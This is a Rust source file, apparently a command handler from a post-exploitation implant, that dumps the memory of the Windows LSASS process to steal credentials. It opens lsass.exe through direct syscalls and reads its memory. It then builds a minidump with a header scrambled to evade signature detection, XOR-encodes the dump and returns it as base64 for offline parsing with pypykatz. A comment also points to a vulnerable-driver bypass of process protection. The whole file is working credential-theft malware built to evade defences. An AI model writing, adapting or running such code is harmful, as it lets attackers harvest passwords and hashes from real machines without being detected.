use anyhow::Result;
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use serde_json::{json, Value};

use super::CommandHandler;

#[cfg(target_os = "windows")]
struct HandleGuard(*mut core::ffi::c_void);

#[cfg(target_os = "windows")]
impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() {
            let _ = dinvk::syscall!("NtClose", self.0);
        }
    }
}

pub struct LsassDumpHandler;

impl CommandHandler for LsassDumpHandler {
    fn execute(&self, _args: Value) -> Result<Value> {
        execute_lsass_dump()
    }
}

#[cfg(target_os = "windows")]
fn execute_lsass_dump() -> Result<Value> {
    let pid = find_lsass_pid()
        .ok_or_else(|| anyhow::anyhow!("lsass.exe not found in process list"))?;

    let handle = match open_lsass_handle(pid) {
        Ok(h) => h,
        Err(e) => {
            return Ok(json!({
                "ppl_blocked": true,
                "error": e.to_string(),
                "hint": "LSASS is PPL-protected; requires BYOVD kernel driver to bypass"
            }));
        }
    };

    let _guard = HandleGuard(handle);

    let regions = enumerate_lsass_memory(handle)?;
    let memory = read_lsass_memory(handle, &regions)?;

    let dump = build_minidump(memory);

    const XOR_KEY: u8 = 0x4f;
    let enc: Vec<u8> = dump.iter().map(|&b| b ^ XOR_KEY).collect();
    let size_bytes = enc.len();
    let b64 = STANDARD.encode(&enc);

    Ok(json!({
        "dump_b64": b64,
        "xor_key": "4f",
        "size_bytes": size_bytes,
        "note": "XOR-decrypt then parse with pypykatz"
    }))
}

#[cfg(not(target_os = "windows"))]
fn execute_lsass_dump() -> Result<Value> {
    anyhow::bail!("lsass_dump is only supported on Windows")
}

#[cfg(target_os = "windows")]
fn find_lsass_pid() -> Option<u32> {
    use sysinfo::{ProcessesToUpdate, System};
    let mut sys = System::new();
    sys.refresh_processes(ProcessesToUpdate::All, true);
    let pid = sys
        .processes_by_exact_name("lsass.exe".as_ref())
        .next()
        .map(|p| p.pid().as_u32());
    pid
}

type Handle = *mut core::ffi::c_void;

#[cfg(target_os = "windows")]
fn open_lsass_handle(pid: u32) -> anyhow::Result<Handle> {
    use core::ffi::c_void;
    use dinvk::winapis::NT_SUCCESS;

    #[repr(C)]
    struct ObjectAttributes {
        len: u32,
        root: usize,
        name: *const c_void,
        attrs: u32,
        sd: *const c_void,
        sqos: *const c_void,
    }

    #[repr(C)]
    struct ClientId {
        proc_id: usize,
        thread_id: usize,
    }

    const PROCESS_VM_READ: u32 = 0x0010;
    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;

    let mut h: Handle = core::ptr::null_mut();
    let oa = ObjectAttributes {
        len: core::mem::size_of::<ObjectAttributes>() as u32,
        root: 0,
        name: core::ptr::null(),
        attrs: 0,
        sd: core::ptr::null(),
        sqos: core::ptr::null(),
    };
    let cid = ClientId {
        proc_id: pid as usize,
        thread_id: 0,
    };

    let st = dinvk::syscall!(
        "NtOpenProcess",
        &mut h,
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        &oa as *const ObjectAttributes as *const c_void,
        &cid as *const ClientId as *const c_void
    );

    if st.map(NT_SUCCESS) != Some(true) {
        anyhow::bail!("NtOpenProcess failed - PPL may be active");
    }
    Ok(h)
}

#[cfg(target_os = "windows")]
fn enumerate_lsass_memory(handle: Handle) -> anyhow::Result<Vec<(u64, usize)>> {
    use core::ffi::c_void;
    use core::mem::size_of;
    use dinvk::winapis::NT_SUCCESS;

    // Matches MEMORY_BASIC_INFORMATION layout for 64-bit Windows.
    #[repr(C)]
    struct MemoryBasicInformation {
        base_address: *mut c_void,
        allocation_base: *mut c_void,
        allocation_protect: u32,
        _partition_id: u16,
        region_size: usize,
        state: u32,
        protect: u32,
        mem_type: u32,
    }

    const MEM_COMMIT: u32 = 0x1000;
    const PAGE_NOACCESS: u32 = 0x01;

    let mut regions: Vec<(u64, usize)> = Vec::new();
    let mut addr: u64 = 0;

    loop {
        let mut mbi = MemoryBasicInformation {
            base_address: core::ptr::null_mut(),
            allocation_base: core::ptr::null_mut(),
            allocation_protect: 0,
            _partition_id: 0,
            region_size: 0,
            state: 0,
            protect: 0,
            mem_type: 0,
        };
        let mut ret: usize = 0;

        let st = dinvk::syscall!(
            "NtQueryVirtualMemory",
            handle,
            addr as *const c_void,
            0u32,
            &mut mbi as *mut MemoryBasicInformation as *mut c_void,
            size_of::<MemoryBasicInformation>(),
            &mut ret as *mut usize
        );

        if st.map(NT_SUCCESS) != Some(true) {
            break;
        }

        if mbi.region_size == 0 {
            break;
        }

        if mbi.state == MEM_COMMIT && mbi.protect != PAGE_NOACCESS {
            regions.push((addr, mbi.region_size));
        }

        addr = match addr.checked_add(mbi.region_size as u64) {
            Some(next) => next,
            None => break,
        };

        if addr >= 0x7FFF_FFFF_FFFF {
            break;
        }
    }

    Ok(regions)
}

#[cfg(target_os = "windows")]
fn read_lsass_memory(
    handle: Handle,
    regions: &[(u64, usize)],
) -> anyhow::Result<Vec<(u64, Vec<u8>)>> {
    use core::ffi::c_void;
    use dinvk::winapis::NT_SUCCESS;

    let mut result: Vec<(u64, Vec<u8>)> = Vec::new();

    for &(base, size) in regions {
        let mut buf = vec![0u8; size];
        let mut read: usize = 0;

        let st = dinvk::syscall!(
            "NtReadVirtualMemory",
            handle,
            base as *const c_void,
            buf.as_mut_ptr() as *mut c_void,
            size,
            &mut read as *mut usize
        );

        if st.map(NT_SUCCESS) == Some(true) && read > 0 {
            buf.truncate(read);
            result.push((base, buf));
        }
    }

    Ok(result)
}

#[cfg(target_os = "windows")]
fn build_minidump(regions: Vec<(u64, Vec<u8>)>) -> Vec<u8> {
    let n = regions.len();

    // BaseRva: offset where raw memory data begins.
    // = 32 (header) + 12 (directory entry) + 16 (Memory64List header) + 16 * n (descriptors)
    let base_rva: u64 = (44 + 16 * n) as u64;

    // stream_data_size = Memory64List header (16) + descriptors (16 * n)
    let stream_data_size: u32 = (16 + 16 * n) as u32;

    let mut out: Vec<u8> = Vec::new();

    // Header (32 bytes): scrambled signature defeats MDMP signature detection.
    out.extend_from_slice(b"PMDM");           // bytes 0-3: scrambled signature
    out.extend_from_slice(&0xA793u32.to_le_bytes()); // bytes 4-7: version
    out.extend_from_slice(&1u32.to_le_bytes());      // bytes 8-11: NumberOfStreams
    out.extend_from_slice(&32u32.to_le_bytes());     // bytes 12-15: StreamDirectoryRva
    out.extend_from_slice(&0u32.to_le_bytes());      // bytes 16-19: CheckSum
    out.extend_from_slice(&0u32.to_le_bytes());      // bytes 20-23: TimeDateStamp
    out.extend_from_slice(&0u64.to_le_bytes());      // bytes 24-31: Flags

    // MINIDUMP_DIRECTORY entry (12 bytes, at offset 32).
    out.extend_from_slice(&9u32.to_le_bytes());               // Memory64ListStream type
    out.extend_from_slice(&stream_data_size.to_le_bytes());   // DataSize
    out.extend_from_slice(&44u32.to_le_bytes());              // Rva (32 + 12)

    // Memory64List header (16 bytes, at offset 44).
    out.extend_from_slice(&(n as u64).to_le_bytes());  // NumberOfMemoryRanges
    out.extend_from_slice(&base_rva.to_le_bytes());    // BaseRva

    // Descriptors (16 bytes each): start_addr u64 + size u64.
    for &(addr, ref data) in &regions {
        out.extend_from_slice(&addr.to_le_bytes());
        out.extend_from_slice(&(data.len() as u64).to_le_bytes());
    }

    // Raw memory data.
    for (_, data) in regions {
        out.extend_from_slice(&data);
    }

    out
}

#[cfg(test)]
mod tests {
    #[test]
    fn xor_key_constant() {
        const XOR_KEY: u8 = 0x4f;
        let data = b"test data";
        let enc: Vec<u8> = data.iter().map(|&b| b ^ XOR_KEY).collect();
        let dec: Vec<u8> = enc.iter().map(|&b| b ^ XOR_KEY).collect();
        assert_eq!(dec, data);
    }

    #[test]
    fn minidump_header_scrambled() {
        // Verify the scrambled signature is not the real MDMP signature.
        assert_ne!(b"PMDM", b"MDMP");
    }

    #[test]
    fn compiles_on_host() {}
}
